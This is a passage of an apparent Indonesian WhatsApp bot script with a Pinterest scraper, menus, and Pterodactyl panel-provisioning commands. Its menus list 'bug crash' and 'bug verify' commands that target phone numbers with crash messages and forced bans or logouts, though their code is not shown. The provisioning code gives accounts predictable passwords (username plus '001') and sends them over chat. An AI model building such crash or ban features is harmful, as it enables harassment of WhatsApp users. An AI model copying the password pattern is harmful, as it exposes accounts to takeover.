	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	  "Rudi Junaedi", 
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	m.reply(response)
  }
break

case 'pinterest': case 'pin': {
  if (!text) return reply(`example: pin nakano`);
  //try {
  await m.reply('loading');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kalz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `*gᥲmᑲᥲr kᥱ -${i++}*`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '*⦉ 𝐏𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓 𝐒𝐇𝐄𝐀𝐑𝐂𝐇 ⦊*',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await kalz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

case "tqto": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*Terimakasih Untuk Para Pengembang Script*
• DitzXploit
• Ikal
• KayyOfc
• Baileys ( Server )
• WhisKeyy ( Server Socket )
• WhatsApp ( Penyedia Layanan )

*NOTE  ❗: JANGAN PERSALAH GUNAKAN BOT INI DEMI KEPENTINGAN PRIBADI KARENA BOT INI DI CIPTAKAN UNTUK MEMPERMUDAH MENGAKSES*

`
await reply(Styles(menuu));
}
break
case "panelmenu": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*PANEL MENU*
${tanda} ${prefix}panel
${tanda} ${prefix}addusr
${tanda} ${prefix}addsrv
${tanda} ${prefix}admin
${tanda} ${prefix}delusr
${tanda} ${prefix}delsrv
${tanda} ${prefix}detusr
${tanda} ${prefix}listadmin
${tanda} ${prefix}listusr
${tanda} ${prefix}listsrv
${tanda} ${prefix}reinstall
${tanda} ${prefix}restartsrv
${tanda} ${prefix}ramlist
${tanda} ${prefix}spanel
${tanda} ${prefix}startsrv
${tanda} ${prefix}stopsrv
${tanda} ${prefix}suspend
${tanda} ${prefix}tutorial
${tanda} ${prefix}unsuspend 
${tanda} ${prefix}updatesrv
${tanda} ${prefix}webpanel

`
await reply(Styles(menuu));
}
break
case "othermenu": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*OTHER MENU*
${tanda} ${prefix}ai 
${tanda} ${prefix}addcase
${tanda} ${prefix}delcase
${tanda} ${prefix}listcase
${tanda} ${prefix}getcase 
${tanda} ${prefix}totalfitur
${tanda} ${prefix}public
${tanda} ${prefix}self
${tanda} ${prefix}restart
${tanda} ${prefix}runtime
${tanda} ${prefix}addprem
${tanda} ${prefix}delprem
${tanda} ${prefix}listprem
${tanda} ${prefix}upsw
${tanda} ${prefix}getsw
${tanda} ${prefix}listsw
${tanda} ${prefix}bcgc
${tanda} ${prefix}bcimg
${tanda} ${prefix}sticker
${tanda} ${prefix}payment
${tanda} ${prefix}qc
${tanda} ${prefix}hdr
${tanda} ${prefix}autoread
${tanda} ${prefix}autobio
${tanda} ${prefix}pushkontak2
${tanda} ${prefix}listgc
${tanda} ${prefix}tourl
    
`
await reply(Styles(menuu));
}
break
case "downloadmenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*DOWNLOAD MENU*
${tanda} ${prefix}ytmp3
${tanda} ${prefix}ytmp4
${tanda} ${prefix}tt
${tanda} ${prefix}instagram
${tanda} ${prefix}play
${tanda} ${prefix}spotify
  
`
await reply(Styles(menuu));
}
break
case "groupmenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*GROUP MENU*
${tanda} ${prefix}totag
${tanda} ${prefix}hidetag
${tanda} ${prefix}tagall
${tanda} ${prefix}linkgc
${tanda} ${prefix}resetlinkgc
${tanda} ${prefix}sendlinkgc
${tanda} ${prefix}promote

  
`
await reply(Styles(menuu));
}
break
case "storemenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*STORE MENU*
${tanda} ${prefix}batal
${tanda} ${prefix}done
${tanda} ${prefix}listpanel
${tanda} ${prefix}proses
${tanda} ${prefix}reqpanel
${tanda} ${prefix}sewa
${tanda} ${prefix}sewabot
${tanda} ${prefix}spanel
${tanda} ${prefix}tunda
${tanda} ${prefix}testi1
${tanda} ${prefix}testi2
${tanda} ${prefix}testi3
${tanda} ${prefix}testi4
${tanda} ${prefix}testi5
  
`
await reply(Styles(menuu));
}
break
case "bugnumber": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG NUMBER*
${tanda} ${prefix}🔥 62898xxxxx
${tanda} ${prefix}☕ 62898xxxxx
${tanda} ${prefix}🌷 62898xxxxx

`
await reply(Styles(menuu));
}
break
case "bugverify": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG VERIFY*
${tanda} ${prefix}verify 62898xxxx
${tanda} ${prefix}banned 62898xxxx
${tanda} ${prefix}basmi 62898xxxx
${tanda} ${prefix}logout 62898xxxx
${tanda} ${prefix}kenon 62898xxxx
`
await reply(Styles(menuu));
}
break
case "bugcrash": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG CRASH*
${tanda} ${prefix}xcrash
${tanda} ${prefix}xioscrash2
${tanda} ${prefix}xcrash
${tanda} ${prefix}xcrash2
${tanda} ${prefix}delaybug
${tanda} ${prefix}pmbug
${tanda} ${prefix}amountbug
`
await reply(Styles(menuu));
}
break
//=============== F E A T U R E ======================//
// PanelMenu
case "1gb": {
        if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gb": {
        if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isPrem) return reply(`*maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unli": {
       if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
